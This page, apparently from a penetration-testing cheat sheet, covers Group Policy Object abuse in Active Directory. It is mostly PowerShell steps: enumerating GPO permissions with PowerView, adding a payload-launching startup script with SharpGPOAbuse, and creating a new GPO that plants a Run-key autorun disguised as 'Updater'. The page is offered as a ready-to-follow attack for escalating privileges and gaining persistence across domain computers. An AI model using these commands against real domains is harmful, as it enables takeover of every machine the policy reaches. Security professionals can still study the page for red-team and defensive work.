---
layout: default
title: GPO Abuse
parent: Active Directory
nav_order: 1
permalink: /ad/gpo/
---

# GPO Abuse
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Vulnerability

By default, only Domain Admins can create Group Policy Objects and link them to Organizational Units in the domain. Nevertheless, this right is sometimes delegated to other teams for organizational purposes. If you have compromised an account who has the right to create and/or modify GPOs, you could take advantage of it to escalate your privileges by deploying malicious ones.

## Prerequisites

* Privileged domain user with the right to create and/or modify GPO.

## Exploit

To modify existing GPO, follow these commands.

```powershell
# List GPOs and lookup on principals that can CreateChild or modify them.
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty" }

# Get the name and the path of the GPO.
Get-DomainGPO -Identity "$ObjectDN" | select displayName, gpcFileSysPath

# Get the principal name which has privileges on the GPO.
ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107

# Get the DN of the OUs on which the GPO is applied.
Get-DomainOU -GPLink "$guid" | select distinguishedName

# Get computers in these OUs.
Get-DomainComputer -SearchBase "$dn" | select dnsHostName

# Find somewhere you can put your payload.
Find-DomainShare -CheckShareAccess

# Insert a startup script in the GPO.
.\SharpGPOAbuse.exe --AddComputerScript --ScriptName name.bat --ScriptContents "start /b $PathToYourPayload" --GPOName "$GPOName"

# To force the GPO application (reboot the machine).
gpupdate /force
```

To create a new GPO, follow these commands. You'll need Remote Server Administration Tools (RSAT) optional Windows feature installed.

```powershell
# Get domain objects that can create new GPO.
Get-DomainObjectAcl -Identity "CN=Policies,CN=System,DC=$domain,DC=$com" -ResolveGUIDs | ? { $_.ObjectAceType -Eq "Group-Policy-Container" -And $_.ActiveDirectoryRights -Contains "CreateChild" } | % { ConvertFrom-SID $_.SecurityIdentifier }

# Get domain objects that can link GPO to an OU.
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | Select-Object -Property ObjectDN,ActiveDirectoryRights,ObjectAceType,SecurityIdentifier | Format-List

# Create the new GPO
New-GPO -Name "$name"

# Add an autorun key in the GPO directly with RSAT.
Set-GPPrefRegistryValue -Name "$name" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "C:\Windows\System32\cmd.exe /c $PathToYourPayload" -Type ExpandString
```